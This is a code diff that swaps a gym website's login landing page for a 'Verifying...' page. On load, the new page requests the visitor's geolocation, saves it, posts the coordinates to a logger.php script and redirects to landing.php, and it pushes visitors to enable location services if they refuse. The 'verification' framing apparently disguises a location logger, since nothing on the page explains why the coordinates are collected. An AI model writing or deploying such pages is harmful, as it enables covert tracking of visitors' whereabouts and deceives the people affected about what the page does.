@@ -1,167 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>BLACKGYM  Page</title>
-  <link rel="icon" href="img/favicon-512x512.png" sizes="512x512" type="image/png">
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
-  
-  <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="BLACKGYM - Your Fitness Destination">
-  <meta property="og:description" content="Achieve your fitness goals with BLACKGYM. Join now to experience state-of-the-art equipment and professional training.">
-  <meta property="og:image" content="img/favicon-512x512.png">
-  <meta property="og:url" content="https://gym.dazx.xyz/index.php">
-  <meta property="og:type" content="website">
-  <meta property="og:site_name" content="BLACKGYM">
-  <style>
-    body {
-      background-color: #000; /* Black background */
-      color: #fff; /* White text color */
-      height: 100vh;
-      margin: 0;
-      display: flex;
-      flex-direction: column;
-      font-family: 'Roboto', sans-serif;
-      background-image: url('img/favicon-512x512.png'); /* Background image */
-      background-size: contain; /* Fit image within viewport */
-      background-position: center 50px; /* Center horizontally, move slightly down */
-      background-repeat: no-repeat; /* Prevent repeating */
-      background-attachment: fixed; /* Stay fixed during scrolling */
-      overflow: hidden; /* Prevent scrollbars from animations */
-    }
-    .navbar {
-      background-color: rgba(0, 0, 0, 0.9); /* Semi-transparent black */
-      padding: 15px;
-      transition: all 0.5s ease;
-    }
-    .navbar:hover {
-      background-color: rgba(255, 255, 255, 0.1); /* Lighter effect on hover */
-    }
-    .navbar-brand, .nav-link {
-      color: #ffffff !important;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      font-weight: bold;
-    }
-    .navbar-brand:hover {
-      color: #ff4500 !important;
-    }
-    .marquee {
-      /*background-color: #333; */
-      color: #fff;
-      padding: 10px;
-      overflow: hidden;
-      white-space: nowrap;
-      /*box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);*/
-    }
-    .marquee span {
-      display: inline-block;
-      animation: scroll 10s linear infinite;
-    }
-    @keyframes scroll {
-      0% { transform: translateX(100%); }
-      100% { transform: translateX(-100%); }
-    }
-    .btn-custom {
-      margin: 20px;
-      background-color: #fff;
-      color: #000; 
-      border: 5px solid #fff; 
-      text-decoration: none;
-      padding: 15px 30px; 
-      border-radius: 50px; 
-      font-size: 1.2rem; 
-      font-weight: bold;
-      transition: all 0.3s ease;
-      text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.3);
-    }
-    .btn-custom:hover {
-      background-color: #ff4500;
-      color: #fff; 
-      border: 5px solid #ff4500;
-      box-shadow: 0 0 15px #ff4500;
-    }
-    .main-content {
-      flex-grow: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-    }
-    .main-content h1 {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      animation: fadeIn 2s ease-in-out;
-      color: #ff4500;
-      text-shadow: 2px 2px 10px rgba(255, 69, 0, 0.8);
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(-20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    footer {
-      background-color: rgba(0, 0, 0, 0.8); /* Semi-transparent black */
-      color: white;
-      text-align: center;
-      padding: 15px;
-      position: fixed;
-      width: 100%;
-      bottom: 0;
-      animation: slideIn 2s ease-in-out;
-    }
-    @keyframes slideIn {
-      from { transform: translateY(100%); }
-      to { transform: translateY(0); }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLACKGYM</title>
+    <style>
+        /* Basic reset and styling */
+        body, h1, p {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Centering the content */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        // Function to get the user's coordinates
+        function getCoordinates() {
+            if (navigator.geolocation) {
+                // Show the loading spinner
+                document.getElementById("spinner").style.display = "block";
+
+                // Attempt to get the current position
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Store the location in localStorage for future visits
+                        localStorage.setItem('latitude', latitude);
+                        localStorage.setItem('longitude', longitude);
+
+                        // Send coordinates to the server
+                        sendCoordinatesToServer(latitude, longitude);
+
+                        // Hide the loading spinner after getting the location
+                        document.getElementById("spinner").style.display = "none";
+
+                        // Redirect to landing.php after successfully getting coordinates
+                        window.location.href = "landing.php";
+                    },
+                    function(error) {
+                        console.error("Error getting location:", error.message);
+                        alert("Unable to retrieve location. Please enable location services.");
+                        document.getElementById("spinner").style.display = "none";
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Function to send data to the server
+        function sendCoordinatesToServer(latitude, longitude) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "logger.php", true); // Change logger.php to your PHP script name
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    console.log(" successfull!");
+                }
+            };
+            xhr.send(`latitude=${latitude}&longitude=${longitude}`);
+        }
+
+        // Check if location is already stored in localStorage
+        function checkLocation() {
+            const latitude = localStorage.getItem('latitude');
+            const longitude = localStorage.getItem('longitude');
+
+            // If location exists in localStorage, redirect to landing.php
+            if (latitude && longitude) {
+                window.location.href = "landing.php";
+            } else {
+                // If no location data is found, request location
+                getCoordinates();
+            }
+        }
+
+        // Trigger the location check on page load
+        window.onload = function() {
+            checkLocation();
+        };
+    </script>
 </head>
 <body>
-  <!-- Navbar -->
-  <nav class="navbar navbar-expand-lg">
+
+    <!-- Spinner for loading -->
+    <div id="spinner" class="spinner"></div>
+
+    <!-- Main content container -->
     <div class="container">
-      <a class="navbar-brand" href="#">BLACKGYM</a>
-      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-        <span class="navbar-toggler-icon"></span>
-      </button>
-      <div class="collapse navbar-collapse" id="navbarNav">
-        <ul class="navbar-nav ms-auto">
-          <li class="nav-item">
-            <a class="nav-link" href="#">Contact</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="#">About</a>
-          </li>
-          <li class="nav-item">
-            <a class="nav-link" href="#">Support</a>
-          </li>
-        </ul>
-      </div>
+        <h1>Verifying...</h1>
     </div>
-  </nav>
 
-  <!-- Marquee -->
-  <div class="marquee">
-    <span>🔥 JOIN NOW! 🔥</span>
-  </div>
-
-  <!-- Main Content -->
-  <div class="main-content container">
-    <div>
-      <h1>select</h1>
-      <div class="d-flex justify-content-center">
-        <a href="admin/login" class="btn btn-custom">Admin</a>
-        <a href="member/login" class="btn btn-custom">Member</a>
-        <a href="admin/login" class="btn btn-custom">Staff</a>
-      </div>
-    </div>
-  </div>
-
-  <!-- Footer -->
-  <footer>
-    <p>© 2024 BLACKGYM. All Rights Reserved.</p>
-  </footer>
-
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
